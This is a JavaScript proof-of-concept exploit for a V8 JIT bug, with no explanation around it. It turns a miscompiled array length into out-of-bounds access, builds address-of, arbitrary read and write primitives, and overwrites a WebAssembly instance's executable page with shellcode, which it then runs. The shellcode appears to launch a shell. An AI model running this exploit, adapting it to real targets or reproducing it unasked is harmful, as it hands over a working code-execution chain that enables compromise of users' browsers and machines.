let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);

BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}
BigInt.prototype.smi2f = function() {
    int_view[0] = this << 32n;
    return float_view[0];
}
Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}
Number.prototype.f2smi = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}

Number.prototype.f_hdw = function() {
    float_view[0] = this;
    return int_view[0] >> 32n;
}

Number.prototype.f_ldw = function() {
    float_view[0] = this;
    return int_view[0] & BigInt(2**32-1);
}

Number.prototype.i2f = function() {
    return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
    return BigInt(this).smi2f();
}

function hex(a) {
    return "0x" + a.toString(16);
}

function toLittle(num, buf) {
	return new DataView(buf).getBigUint64(0, false);
}

function print_addr(obj) {
    console.log(hex(obj.f2i()));
}

function trigger(a) {
    let x = -0;
    let y = -0x80000000;

    if (a) {
      x = -1;
      y = 1;
    }

    let z = x - y
    z = z + 0;
    z = Math.max(-4, z);
    z = -z;
    z >>= 2;

    var arr = Array(z);
    let arr_two = [1.1, 2.2, 3.3];
    arr.pop();

    return [arr, arr_two];
}

let isolate = (BigInt(1) << BigInt(32)) - BigInt(1);

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

for (let i = 0; i < 0x10000; i++) {
    trigger(true);
}

let o_tmp = {1: 'A'}

trigger(false);

[a, b] = trigger(false);

// corrupt size of b
a[16] = 0x1000;

let c = [o_tmp];

let d = [1.2];

var arr_buf = new ArrayBuffer(0x100);
var data_view = new DataView(arr_buf);

function addr_of(o) {
    c[0] = o;

    // b[29] == c[0]
    return b[29].f2i() >> BigInt(32) & isolate;
}

// corrupt elements ptr of d
function read(addr) {
    // b[33] == d elements ptr
    var tmp = b[33];
    tmp = tmp.f2i() & isolate << BigInt(32);
    tmp = tmp | addr;
    b[33] = tmp.i2f();

    return d[0].f2i();
}

// corrupt backing store ptr of arr_buf
function write_64(addr, sc) {
    back_l = b[39].f2i();
    back_h = b[40].f2i();

    var l = ((addr & isolate) << BigInt(32)) | (back_l & isolate);
    var h = (back_h & isolate << BigInt(32)) | (addr >> BigInt(32) & isolate);

    b[39] = l.i2f();
    b[40] = h.i2f();

    for (let i = 0; i < sc.length; i++) {
        data_view.setUint32(4 * i, sc[i], true);
    }
}

let wi = addr_of(wasm_instance);

let rwx = read(wi + BigInt(0x60));

var shellcode = [
    0xbb48c031,
    0x91969dd1,
    0xff978cd0,
    0x53dbf748,
    0x52995f54,
    0xb05e5457,
    0x50f3b,
]

write_64(rwx, shellcode);

f();


